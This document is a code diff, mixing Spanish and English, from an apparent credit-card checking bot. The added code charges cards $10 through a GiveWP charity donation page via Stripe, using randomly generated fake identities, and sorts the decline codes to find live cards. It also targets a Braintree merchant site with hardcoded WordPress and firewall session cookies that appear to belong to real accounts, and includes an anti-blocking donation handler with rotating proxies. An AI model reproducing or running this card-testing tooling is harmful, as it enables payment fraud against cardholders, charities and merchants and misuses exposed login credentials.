-        if not url.startswith(('http://', 'https://')):
-            url = 'https://' + url
-        
-        try:
-            async with aiohttp.ClientSession() as session:
-                start_time = time.time()
-                
-                headers = {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                    'Accept-Language': 'en-US,en;q=0.5',
-                    'Accept-Encoding': 'gzip, deflate',
-                }
-                
-                async with session.get(url, headers=headers, timeout=timeout, ssl=False) as resp:
-                    html = await resp.text()
-                    elapsed = time.time() - start_time
-                    
-                    html_analysis = await CaptchaDetector.detect_from_html(url, html)
-                    headers_analysis = await CaptchaDetector.analyze_headers(dict(resp.headers))
-                    
-                    return {
-                        'success': True,
-                        'url': url,
-                        'status_code': resp.status,
-                        'response_time': elapsed,
-                        'page_size': len(html),
-                        'security_headers': headers_analysis,
-                        'captcha': html_analysis,
-                        'recommendation': CaptchaDetector._get_recommendation(html_analysis)
-                    }
-                    
-        except Exception as e:
-            return {
-                'success': False,
-                'url': url,
-                'error': str(e)[:100],
-            }
-    
-    @staticmethod
-    def _get_recommendation(analysis: Dict) -> str:
-        if not analysis['has_captcha']:
-            return "✅ Sitio sin CAPTCHA detectable"
-        
-        types = analysis['detected_types']
-        if 'recaptcha_v2' in types:
-            return "⚠️ Tiene reCAPTCHA v2"
-        elif 'recaptcha_v3' in types:
-            return "⚠️ Tiene reCAPTCHA v3 (invisible)"
-        elif 'hcaptcha' in types:
-            return "⚠️ Tiene hCaptcha"
-        elif 'cloudflare_turnstile' in types:
-            return "⚠️ Tiene Cloudflare Turnstile"
-        else:
-            return f"⚠️ Posible CAPTCHA detectado"
-
-# ================== CACHÉ DE BIN ==================
-BIN_CACHE = {}
-BIN_CACHE_LOCK = asyncio.Lock()
-BIN_SESSION = None
-BIN_SESSION_LOCK = asyncio.Lock()
-
-async def get_bin_session() -> aiohttp.ClientSession:
-    global BIN_SESSION
-    async with BIN_SESSION_LOCK:
-        if BIN_SESSION is None or BIN_SESSION.closed:
-            timeout = aiohttp.ClientTimeout(total=Settings.TIMEOUT_CONFIG["bin_lookup"])
-            BIN_SESSION = aiohttp.ClientSession(timeout=timeout)
-        return BIN_SESSION
-
-async def get_bin_info(bin_code: str) -> Dict:
-    async with BIN_CACHE_LOCK:
-        if bin_code in BIN_CACHE:
-            cache_time, data = BIN_CACHE[bin_code]
-            if (datetime.now() - cache_time).total_seconds() < 86400:
-                return data
     
     try:
-        session = await get_bin_session()
-        async with session.get(f"https://lookup.binlist.net/{bin_code}") as resp:
-            if resp.status == 200:
-                try:
-                    data = await asyncio.wait_for(resp.json(), timeout=Settings.TIMEOUT_CONFIG["bin_lookup"])
-                    result = {
-                        "bank": data.get("bank", {}).get("name", "Unknown"),
-                        "brand": data.get("scheme", "Unknown").upper(),
-                        "country": data.get("country", {}).get("alpha2", "UN"),
-                        "type": data.get("type", "Unknown"),
-                    }
-                    
-                    async with BIN_CACHE_LOCK:
-                        BIN_CACHE[bin_code] = (datetime.now(), result)
-                    
-                    return result
-                except asyncio.TimeoutError:
-                    logger.debug(f"Timeout leyendo BIN {bin_code}")
+        r = requests.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data, timeout=30)
+        return r.status_code, r.json()
     except Exception as e:
-        logger.debug(f"Error consultando BIN {bin_code}: {e}")
+        return 0, {"error": {"message": str(e), "type": "connection_error"}}
+
+def sc_submit_donation(session, payment_method_id, form_hash, name, email, addr):
+    """Submit donation to GiveWP page (real charge)"""
+    first, last = name.split(" ", 1) if " " in name else (name, "")
+    submit_url = f"{SC_DONATION_PAGE}?payment-mode=stripe&form-id={SC_FORM_ID}"
     
-    default = {"bank": "Unknown", "brand": "UNKNOWN", "country": "UN", "type": "Unknown"}
-    async with BIN_CACHE_LOCK:
-        BIN_CACHE[bin_code] = (datetime.now(), default)
-    return default
+    headers = {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Origin": SC_SITE_URL,
+        "Referer": SC_DONATION_PAGE,
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
+    }
+    
+    data = {
+        "give-honeypot": "",
+        "give-form-id-prefix": f"{SC_FORM_ID}-1",
+        "give-form-id": SC_FORM_ID,
+        "give-form-title": SC_FORM_TITLE,
+        "give-current-url": SC_DONATION_PAGE,
+        "give-form-url": SC_DONATION_PAGE,
+        "give-form-minimum": "5.00",
+        "give-form-maximum": "999999.99",
+        "give-form-hash": form_hash,
+        "give-price-id": "0",
+        "give-recurring-logged-in-only": "",
+        "give-logged-in-only": "1",
+        "_give_is_donation_recurring": "0",
+        "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
+        "give-amount": SC_DONATE_AMOUNT,
+        "give_stripe_payment_method": payment_method_id,
+        "payment-mode": "stripe",
+        "give_first": first,
+        "give_last": last,
+        "give_company_option": "no",
+        "give_company_name": "",
+        "give_email": email,
+        "give_comment": "",
+        "billing_country": "US",
+        "card_address": addr["line1"],
+        "card_address_2": "",
+        "card_city": addr["city"],
+        "card_state": addr["state"],
+        "card_zip": addr["zip"],
+        "give_action": "purchase",
+        "give-gateway": "stripe",
+    }
+    
+    try:
+        r = session.post(submit_url, headers=headers, data=data,
+                        timeout=60, verify=False, allow_redirects=True)
+        return r.status_code, r.text, r.url
+    except Exception as e:
+        return 0, str(e), ""
 
-# ================== VALIDACIÓN DE TARJETAS ==================
-class CardValidator:
-    @staticmethod
-    def luhn_check(card_number: str) -> bool:
-        def digits_of(n):
-            return [int(d) for d in str(n)]
-        digits = digits_of(card_number)
-        odd_digits = digits[-1::-2]
-        even_digits = digits[-2::-2]
-        checksum = sum(odd_digits)
-        for d in even_digits:
-            checksum += sum(digits_of(d * 2))
-        return checksum % 10 == 0
+def sc_classify_error_text(error_msg):
+    """Classify based on plain text error message"""
+    msg_lower = error_msg.lower()
+    if "declined" in msg_lower:
+        return "DECLINED"
+    elif "insufficient" in msg_lower:
+        return "FUNDS"
+    elif "do_not_honor" in msg_lower:
+        return "FUNDS"
+    elif "incorrect_cvc" in msg_lower or "incorrect cvc" in msg_lower:
+        return "CVV"
+    elif "authentication" in msg_lower or "3d" in msg_lower:
+        return "3DS"
+    elif "expired" in msg_lower:
+        return "DECLINED"
+    elif "fraud" in msg_lower:
+        return "DECLINED"
+    elif "lost" in msg_lower or "stolen" in msg_lower:
+        return "FUNDS"
+    elif "restricted" in msg_lower:
+        return "FUNDS"
+    return "DECLINED"
 
-    @staticmethod
-    def validate_expiry(month: str, year: str) -> bool:
-        try:
-            exp_month = int(month)
-            exp_year = int(year)
-            if len(year) == 2:
-                exp_year += 2000
-            now = datetime.now()
-            if exp_year < now.year:
-                return False
-            if exp_year == now.year and exp_month < now.month:
-                return False
-            return True
-        except:
+def sc_classify_donation_response(status_code, resp_text, final_url=""):
+    """Classify GiveWP donation response from HTML page"""
+    # Step 1: Extract GiveWP error block
+    error_block = re.search(r'class=["\']give_errors?["\'][^>]*>(.*?)</div>', resp_text, re.DOTALL | re.IGNORECASE)
+    if error_block:
+        error_html = error_block.group(1)
+        error_plain = re.sub(r'<[^>]+>', '', error_html).strip()
+        error_plain = re.sub(r'^Error:\s*', '', error_plain, flags=re.IGNORECASE).strip()
+        if error_plain:
+            cat = sc_classify_error_text(error_plain)
+            return cat, error_plain, error_plain, f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    
+    # Step 2: Convert HTML to plain text and search
+    plain_text = re.sub(r'<script[^>]*>.*?</script>', '', resp_text, flags=re.DOTALL | re.IGNORECASE)
+    plain_text = re.sub(r'<style[^>]*>.*?</style>', '', plain_text, flags=re.DOTALL | re.IGNORECASE)
+    plain_text = re.sub(r'<[^>]+>', ' ', plain_text)
+    plain_text = re.sub(r'\s+', ' ', plain_text).strip()
+    plain_lower = plain_text.lower()
+    
+    error_match = re.search(r'error:?\s*(there was an issue[^.]*\.)', plain_lower)
+    if error_match:
+        err = error_match.group(1).strip()
+        if ':' in err:
+            err = err.split(':', 1)[1].strip().rstrip('.')
+        cat = sc_classify_error_text(err)
+        return cat, err, err, f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    
+    txn_match = re.search(r'(there was an issue with your donation[^.]*\.)', plain_lower)
+    if txn_match:
+        err = txn_match.group(1).strip()
+        if ':' in err:
+            err = err.split(':', 1)[1].strip().rstrip('.')
+        cat = sc_classify_error_text(err)
+        return cat, err, err, f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    
+    # Step 3: Check raw text for Stripe decline codes
+    resp_lower = resp_text.lower()
+    if "card was declined" in resp_lower or "card_declined" in resp_lower:
+        return "DECLINED", "Your card was declined", "Your card was declined", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    elif "insufficient_funds" in resp_lower or "insufficient funds" in resp_lower:
+        return "FUNDS", "Insufficient funds", "Insufficient funds", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    elif "do_not_honor" in resp_lower:
+        return "FUNDS", "do_not_honor", "do_not_honor", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    elif "generic_decline" in resp_lower:
+        return "FUNDS", "generic_decline", "generic_decline", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    elif "incorrect_cvc" in resp_lower:
+        return "CVV", "Incorrect CVC", "Incorrect CVC", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    elif "expired_card" in resp_lower:
+        return "DECLINED", "Expired card", "Expired card", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    elif "authentication_required" in resp_lower or "3d_secure" in resp_lower:
+        return "3DS", "3D Secure required", "3D Secure required", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    elif "requires_action" in resp_lower:
+        return "DECLINED", "Requires action (3DS)", "Requires action (3DS)", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    elif "lost_card" in resp_lower or "stolen_card" in resp_lower:
+        return "FUNDS", "Lost/Stolen card", "Lost/Stolen card", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    
+    # Step 4: Check for success (thank you page)
+    thank_match = re.search(r'thank\s*you\s*(for\s*your\s*donation|for\s*donating)', plain_lower)
+    if thank_match:
+        return "CHARGE", "Donation successful", "Donation successful", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    if "donation-confirmation" in final_url.lower() or "success" in final_url.lower():
+        return "CHARGE", "Donation successful", "Donation successful", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    
+    # Step 5: Handle HTTP error pages
+    if status_code >= 400:
+        return "ERROR", f"Site error {status_code}", f"Site error {status_code}", "N/A", "Stripe Charge $10"
+    
+    return "DECLINED", plain_text[:150] if plain_text else "Unknown response", plain_text[:150] if plain_text else "Unknown response", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+
+def check_stripe_charge(cc, month, year, cvv, session=None, form_hash=None):
+    """Check card via GiveWP Stripe Charge $10 gateway"""
+    global sc_form_hash, sc_http_session
+    start_time = time.time()
+    if len(year) == 2:
+        year = f"20{year}"
+    
+    # Generate random identity
+    first = random.choice(SC_FIRST_NAMES)
+    last = random.choice(SC_LAST_NAMES)
+    name = f"{first} {last}"
+    domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com"]
+    email_user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8,12)))
+    email = f"{email_user}@{random.choice(domains)}"
+    addr = random.choice(SC_ADDRESSES)
+    
+    try:
+        # Step 1: Create Stripe payment method
+        pm_status, pm_resp = sc_create_payment_method(cc, month, year, cvv, name, email, addr)
+        elapsed = round(time.time() - start_time, 2)
+        
+        if pm_status != 200 or "id" not in pm_resp:
+            # Payment method creation failed - classify from Stripe error
+            if "error" in pm_resp:
+                error = pm_resp["error"]
+                code = error.get("code", "")
+                decline_code = error.get("decline_code", "")
+                message = error.get("message", "Unknown error")
+                
+                if code == "card_declined":
+                    if decline_code in ("insufficient_funds", "generic_decline", "do_not_honor",
+                                       "transaction_not_allowed", "pickup_card", "restricted_card",
+                                       "lost_card", "stolen_card", "not_permitted"):
+                        return "FUNDS", f"CVV MATCH - {decline_code}", f"CVV MATCH - {decline_code}", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10", elapsed
+                    elif decline_code == "live_mode_test_card":
+                        return "DECLINED", "Test card in live mode", "Test card in live mode", "N/A", "Stripe Charge $10", elapsed
+                    elif decline_code == "incorrect_cvc":
+                        return "CVV", "Incorrect CVC", "Incorrect CVC", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10", elapsed
+                    elif decline_code == "expired_card":
+                        return "DECLINED", "Expired card", "Expired card", "N/A", "Stripe Charge $10", elapsed
+                    elif decline_code == "fraudulent":
+                        return "DECLINED", "Fraudulent", "Fraudulent", "N/A", "Stripe Charge $10", elapsed
+                    else:
+                        return "DECLINED", f"{decline_code} - {message}", f"{decline_code} - {message}", "N/A", "Stripe Charge $10", elapsed
+                elif code == "incorrect_number" or code == "invalid_number":
+                    return "DECLINED", message, message, "N/A", "Stripe Charge $10", elapsed
+                elif code == "incorrect_cvc":
+                    return "CVV", "Incorrect CVC", "Incorrect CVC", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10", elapsed
+                elif code == "authentication_required":
+                    return "3DS", "3D Secure required", "3D Secure required", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10", elapsed
+                elif code in ("card_velocity_exceeded", "rate_limit"):
+                    return "ERROR", "Rate limited", "Rate limited", "N/A", "Stripe Charge $10", elapsed
+                return "DECLINED", message, message, "N/A", "Stripe Charge $10", elapsed
+            return "DECLINED", f"Stripe error {pm_status}", f"Stripe error {pm_status}", "N/A", "Stripe Charge $10", elapsed
+        
+        pm_id = pm_resp.get("id")
+        
+        # Step 2: Submit donation to GiveWP
+        if session is None:
+            session = requests.Session()
+            session.headers.update({
+                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
+            })
+        
+        if form_hash is None:
+            form_hash = sc_fetch_form_nonce(session)
+        
+        don_status, don_resp, final_url = sc_submit_donation(session, pm_id, form_hash, name, email, addr)
+        elapsed = round(time.time() - start_time, 2)
+        
+        if don_status >= 400 and don_status < 500:
+            form_hash = sc_fetch_form_nonce(session)
+            don_status, don_resp, final_url = sc_submit_donation(session, pm_id, form_hash, name, email, addr)
+            elapsed = round(time.time() - start_time, 2)
+        
+        category, status_msg, response_msg, price, gateway = sc_classify_donation_response(don_status, don_resp, final_url)
+        return category, status_msg, response_msg, price, gateway, elapsed
+        
+    except requests.exceptions.Timeout:
+        elapsed = round(time.time() - start_time, 2)
+        return "ERROR", "Timeout", "Request timed out", "N/A", "Stripe Charge $10", elapsed
+    except Exception as e:
+        elapsed = round(time.time() - start_time, 2)
+        return "ERROR", str(e)[:80], str(e)[:80], "N/A", "Stripe Charge $10", elapsed
+
+# ============================================
+# STRIPE CHARGE CARD MANAGEMENT
+# ============================================
+
+def load_sc_cards():
+    return safe_json_load(SC_CARDS_FILE, [])
+
+def save_sc_cards(cards):
+    return safe_json_save(SC_CARDS_FILE, cards)
+
+def add_sc_card(cc, month, year, cvv):
+    cards = load_sc_cards()
+    card_str = f"{cc}|{month}|{year}|{cvv}"
+    if card_str not in cards:
+        cards.append(card_str)
+        save_sc_cards(cards)
+        return True
+    return False
+
+def clear_sc_cards():
+    save_sc_cards([])
+
+def get_all_sc_cards():
+    return load_sc_cards()
+
+def delete_sc_card(card_str):
+    cards = load_sc_cards()
+    if card_str in cards:
+        cards.remove(card_str)
+        save_sc_cards(cards)
+        return True
+    return False
+
+def load_sc_hits():
+    return safe_json_load(SC_HITS_FILE, [])
+
+def save_sc_hit(hit_data):
+    hits = load_sc_hits()
+    hits.append(hit_data)
+    safe_json_save(SC_HITS_FILE, hits)
+    global sc_hits_list
+    sc_hits_list.append(hit_data)
+    try:
+        sqlite_backup.save_hit_backup(hit_data, "stripe_charge")
+    except:
+        pass
+
+def get_sc_hits():
+    global sc_hits_list
+    if not sc_hits_list:
+        sc_hits_list = load_sc_hits()
+    return sc_hits_list
+
+def clear_sc_hits():
+    global sc_hits_list
+    sc_hits_list = []
+    safe_json_save(SC_HITS_FILE, [])
+
+# ============================================
+# BRAINTREE AUTH GATEWAY (trade-chem.co.uk)
+# ============================================
+
+B3_SITE_URL = "https://trade-chem.co.uk"
+B3_ADD_PM_URL = f"{B3_SITE_URL}/my-account/add-payment-method/"
+B3_MY_ACCOUNT_URL = f"{B3_SITE_URL}/my-account/"
+B3_MERCHANT_ID = "zkrjk5krj2dwnsgc"
+B3_MERCHANT_ACCOUNT = "stuarttradechemcouk"
+B3_GRAPHQL_URL = "https://payments.braintree-api.com/graphql"
+B3_CLIENT_API = f"https://api.braintreegateway.com:443/merchants/{B3_MERCHANT_ID}/client_api"
+B3_NONCE_REFRESH_EVERY = 5
+B3_FIRST_NAMES = ["James","Mary","John","Patricia","Robert","Jennifer","Michael","Linda",
+                   "David","Elizabeth","William","Barbara","Richard","Susan","Joseph","Jessica",
+                   "Thomas","Sarah","Charles","Karen","Daniel","Lisa","Mark","Nancy"]
+B3_LAST_NAMES = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis",
+                  "Rodriguez","Martinez","Wilson","Anderson","Taylor","Thomas","Moore","Jackson"]
+B3_ADDRESSES = [
+    {"line1": "236 W 30TH", "city": "NEW YORK", "state": "NY", "zip": "10001", "country": "US"},
+    {"line1": "100 BROADWAY", "city": "NEW YORK", "state": "NY", "zip": "10005", "country": "US"},
+    {"line1": "742 EVERGREEN TER", "city": "SPRINGFIELD", "state": "IL", "zip": "62704", "country": "US"},
+    {"line1": "123 MAIN ST", "city": "LOS ANGELES", "state": "CA", "zip": "90001", "country": "US"},
+    {"line1": "10 DOWNING ST", "city": "LONDON", "state": "", "zip": "SW1A 1AA", "country": "GB"},
+    {"line1": "221B BAKER ST", "city": "LONDON", "state": "", "zip": "NW1 6XE", "country": "GB"},
+    {"line1": "1 HIGH ST", "city": "MANCHESTER", "state": "", "zip": "M1 1AD", "country": "GB"},
+]
+
+def b3_random_identity():
+    first = random.choice(B3_FIRST_NAMES)
+    last = random.choice(B3_LAST_NAMES)
+    user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8,12)))
+    domain = random.choice(["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com"])
+    return first, last, f"{user}@{domain}", random.choice(B3_ADDRESSES)
+
+B3_COOKIE_SETS = [
+    [
+        {"domain": "trade-chem.co.uk", "name": "wordpress_logged_in_4d9c7ece763608b995b6637298409475", "value": "dayamadrid7099%7C1778363368%7CxOgLbD3ioAmtak3rN3aoj5lGH85bQEmPieJJDIm1txY%7C25049f2a8270175a5a950d79bc12e0b91d3c3266543b56140421040fa77cb455", "path": "/"},
+        {"domain": "trade-chem.co.uk", "name": "wfwaf-authcookie-fdddcad932b8083b61bd8da62850a450", "value": "3024%7Cother%7Cread%7C80a6dd52a8a7c716a006fccb87899bd151fec9e62db4062e4d272a89083dc62c", "path": "/"},
+    ],
+    [
+        {"domain": "trade-chem.co.uk", "name": "wordpress_logged_in_4d9c7ece763608b995b6637298409475", "value": "miriamcaicedo725%7C1778444294%7CA2kUP6rN4hujKjqH6EecApiU00u8EbCc7eniyKjvdX7%7C8c83aa4c68d9b27665f794827e65b01b5943fdb30a7f7071e493f05e5cdcf51b", "path": "/"},
+        {"domain": "trade-chem.co.uk", "name": "wfwaf-authcookie-fdddcad932b8083b61bd8da62850a450", "value": "3159%7Cother%7Cread%7C8d49a57f76c7c4d64499531f5a2ff517d4995997e6eb65322df4934ab7d888b7", "path": "/"},
+    ],
+]
+
+def b3_load_cookies(session, cookie_index=0):
+    idx = cookie_index % len(B3_COOKIE_SETS)
+    for c in B3_COOKIE_SETS[idx]:
+        session.cookies.set(c['name'], c['value'], domain=c['domain'], path=c.get('path', '/'))
+    return True
+
+def b3_try_register(session):
+    try:
+        r = session.get(B3_MY_ACCOUNT_URL, verify=False, timeout=30)
+        reg_nonce = re.search(r'name="woocommerce-register-nonce"\s+value="([^"]+)"', r.text)
+        if not reg_nonce:
             return False
-
-    @staticmethod
-    def validate_cvv(cvv: str) -> bool:
-        return cvv.isdigit() and len(cvv) in (3, 4)
-
-    @staticmethod
-    def parse_card(card_str: str) -> Optional[Dict]:
-        parts = card_str.split('|')
-        if len(parts) != 4:
-            return None
-        number, month, year, cvv = parts
-        if not number.isdigit() or len(number) < 13 or len(number) > 19:
-            return None
-        if not CardValidator.luhn_check(number):
-            return None
-        if not CardValidator.validate_expiry(month, year):
-            return None
-        if not CardValidator.validate_cvv(cvv):
-            return None
-        return {
-            "number": number,
-            "month": month,
-            "year": year,
-            "cvv": cvv,
-            "bin": number[:6],
-            "last4": number[-4:]
-        }
-
-# ================== BASE DE DATOS ==================
-class Database:
-    def __init__(self, db_path=Settings.DB_FILE):
-        self.db_path = db_path
-        self._write_lock = asyncio.Lock()
-        self._batch_queue = []
-        self._batch_lock = asyncio.Lock()
-        self._batch_task = None
-        self._initialized = False
-        
-    def _init_db_sync(self):
-        with sqlite3.connect(self.db_path) as conn:
-            conn.execute("PRAGMA journal_mode=WAL")
-            cursor = conn.cursor()
-            
-            # Tabla de usuarios con campos para Stripe
-            cursor.execute('''
-                CREATE TABLE IF NOT EXISTS users (
-                    user_id INTEGER PRIMARY KEY,
-                    sites TEXT DEFAULT '[]',
-                    proxies TEXT DEFAULT '[]',
-                    cards TEXT DEFAULT '[]',
-                    givewp_sites TEXT DEFAULT '[]',
-                    stripe_urls TEXT DEFAULT '[]',
-                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-                )
-            ''')
-            
-            cursor.execute('''
-                CREATE TABLE IF NOT EXISTS results (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    user_id INTEGER,
-                    card_bin TEXT,
-                    card_last4 TEXT,
-                    site TEXT,
-                    proxy TEXT,
-                    status TEXT,
-                    confidence TEXT,
-                    reason TEXT,
-                    response_time REAL,
-                    http_code INTEGER,
-                    price TEXT,
-                    bin_info TEXT,
-                    patterns TEXT,
-                    gateway TEXT DEFAULT 'shopify',
-                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-                )
-            ''')
-            
-            # Tabla para resultados de Stripe
-            cursor.execute('''
-                CREATE TABLE IF NOT EXISTS stripe_results (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    user_id INTEGER,
-                    card_bin TEXT,
-                    card_last4 TEXT,
-                    url TEXT,
-                    status TEXT,
-                    reason TEXT,
-                    response_time REAL,
-                    fraud_score TEXT,
-                    three_ds INTEGER DEFAULT 0,
-                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-                )
-            ''')
-            
-            cursor.execute('''
-                CREATE TABLE IF NOT EXISTS rate_limits (
-                    user_id INTEGER PRIMARY KEY,
-                    last_check TIMESTAMP,
-                    checks_today INTEGER DEFAULT 0,
-                    last_mass TIMESTAMP,
-                    mass_count_hour INTEGER DEFAULT 0,
-                    last_reset DATE DEFAULT CURRENT_DATE
-                )
-            ''')
-            
-            conn.commit()
-
-    async def initialize(self):
-        if self._initialized:
-            return
-        loop = asyncio.get_event_loop()
-        await loop.run_in_executor(None, self._init_db_sync)
-        self._batch_task = asyncio.create_task(self._batch_processor())
-        self._initialized = True
-        logger.info(f"✅ Base de datos inicializada")
-
-    async def _batch_processor(self):
-        while True:
-            try:
-                await asyncio.sleep(5)
-                if self._batch_queue:
-                    async with self._batch_lock:
-                        batch = self._batch_queue.copy()
-                        self._batch_queue.clear()
-                    
-                    async with self._write_lock:
-                        await self._execute_batch(batch)
-            except asyncio.CancelledError:
-                break
-            except Exception as e:
-                logger.error(f"Error en batch processor: {e}")
-
-    async def _execute_batch(self, batch: List[tuple]):
-        try:
-            loop = asyncio.get_event_loop()
-            await loop.run_in_executor(None, self._sync_execute_batch, batch)
-        except Exception as e:
-            logger.error(f"Error en batch insert: {e}")
-
-    def _sync_execute_batch(self, batch: List[tuple]):
-        with sqlite3.connect(self.db_path) as conn:
-            cursor = conn.cursor()
-            cursor.executemany(
-                """INSERT INTO results 
-                   (user_id, card_bin, card_last4, site, proxy, status, confidence,
-                    reason, response_time, http_code, price, bin_info, patterns, gateway)
-                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
-                batch
-            )
-            conn.commit()
-
-    async def save_result(self, user_id: int, result: JobResult, gateway: str = "shopify"):
-        patterns_json = json.dumps(result.patterns_detected)
-        async with self._batch_lock:
-            self._batch_queue.append((
-                user_id, 
-                result.job.card_data['bin'], 
-                result.job.card_data['last4'],
-                result.job.site, 
-                result.job.proxy, 
-                result.status.value,
-                result.confidence.value, 
-                result.reason, 
-                result.response_time,
-                result.http_code, 
-                result.price, 
-                json.dumps(result.bin_info),
-                patterns_json,
-                gateway
-            ))
-
-    async def save_stripe_result(self, user_id: int, result: StripeHitResult, url: str):
-        """Guarda resultado de Stripe Hitter"""
-        async with self._batch_lock:
-            self._batch_queue.append((
-                'stripe',
-                user_id,
-                result.bin,
-                result.card_last4,
-                url,
-                result.status,
-                result.reason,
-                result.response_time,
-                result.fraud_score,
-                1 if result.three_ds else 0
-            ))
-
-    async def execute(self, query: str, params: tuple = ()):
-        async with self._write_lock:
-            loop = asyncio.get_event_loop()
-            return await loop.run_in_executor(None, lambda: self._sync_execute(query, params))
-
-    def _sync_execute(self, query: str, params: tuple):
-        with sqlite3.connect(self.db_path) as conn:
-            cursor = conn.cursor()
-            cursor.execute(query, params)
-            conn.commit()
-            return cursor
-
-    async def fetch_one(self, query: str, params: tuple = ()):
-        loop = asyncio.get_event_loop()
-        return await loop.run_in_executor(None, lambda: self._sync_fetch_one(query, params))
-
-    def _sync_fetch_one(self, query: str, params: tuple):
-        with sqlite3.connect(self.db_path) as conn:
-            conn.row_factory = sqlite3.Row
-            cursor = conn.cursor()
-            cursor.execute(query, params)
-            row = cursor.fetchone()
-            return dict(row) if row else None
-
-    async def fetch_all(self, query: str, params: tuple = ()):
-        loop = asyncio.get_event_loop()
-        return await loop.run_in_executor(None, lambda: self._sync_fetch_all(query, params))
-
-    def _sync_fetch_all(self, query: str, params: tuple):
-        with sqlite3.connect(self.db_path) as conn:
-            conn.row_factory = sqlite3.Row
-            cursor = conn.cursor()
-            cursor.execute(query, params)
-            return [dict(row) for row in cursor.fetchall()]
-
-    async def get_stats(self, user_id: int) -> Dict:
-        """Obtiene estadísticas del usuario"""
-        with sqlite3.connect(self.db_path) as conn:
-            cursor = conn.cursor()
-            
-            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ?", (user_id,))
-            total = cursor.fetchone()[0]
-            
-            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status = 'charged'", (user_id,))
-            charged = cursor.fetchone()[0]
-            
-            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status = 'declined'", (user_id,))
-            declined = cursor.fetchone()[0]
-            
-            cursor.execute("SELECT COUNT(*) FROM stripe_results WHERE user_id = ? AND status = 'LIVE'", (user_id,))
-            stripe_live = cursor.fetchone()[0]
-            
-            cursor.execute("SELECT COUNT(*) FROM stripe_results WHERE user_id = ? AND status = 'DECLINED'", (user_id,))
-            stripe_declined = cursor.fetchone()[0]
-            
-            cursor.execute("SELECT COUNT(*) FROM stripe_results WHERE user_id = ? AND status = 'FRAUDULENT'", (user_id,))
-            stripe_fraud = cursor.fetchone()[0]
-            
-            cursor.execute("SELECT COUNT(*) FROM stripe_results WHERE user_id = ? AND three_ds = 1", (user_id,))
-            stripe_3ds = cursor.fetchone()[0]
-            
-            return {
-                "total": total,
-                "charged": charged,
-                "declined": declined,
-                "stripe_live": stripe_live,
-                "stripe_declined": stripe_declined,
-                "stripe_fraud": stripe_fraud,
-                "stripe_3ds": stripe_3ds
-            }
-
-    async def cleanup_old_results(self, days: int = 7):
-        await self.execute(
-            "DELETE FROM results WHERE created_at < date('now', ?)",
-            (f"-{days} days",)
-        )
-
-    async def shutdown(self):
-        if self._batch_task:
-            self._batch_task.cancel()
-            try:
-                await self._batch_task
-            except asyncio.CancelledError:
-                pass
-        global BIN_SESSION
-        if BIN_SESSION and not BIN_SESSION.closed:
-            await BIN_SESSION.close()
-
-# ================== ANTI-BLOCK GIVEWP HANDLER ==================
-class AntiBlockGiveWPDonationHandler:
-    """Maneja donaciones con técnicas anti-bloqueo"""
-    
-    def __init__(self, user_id: int, proxies: List[str] = None, session_cookies: str = None):
-        self.user_id = user_id
-        self.proxies = proxies if proxies else []
-        self.proxy_index = 0
-        self.session = None
-        self.cookies = self._parse_cookies(session_cookies) if session_cookies else {}
-        self.base_url = "https://donate.schf.org.au"
-        self.personal_data = {}
-        self.user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
-        ]
-        logger.info(f"🛡️ Inicializando AntiBlockHandler - {len(proxies)} proxies disponibles")
-        
-    def _parse_cookies(self, cookie_string: str) -> Dict:
-        cookies = {}
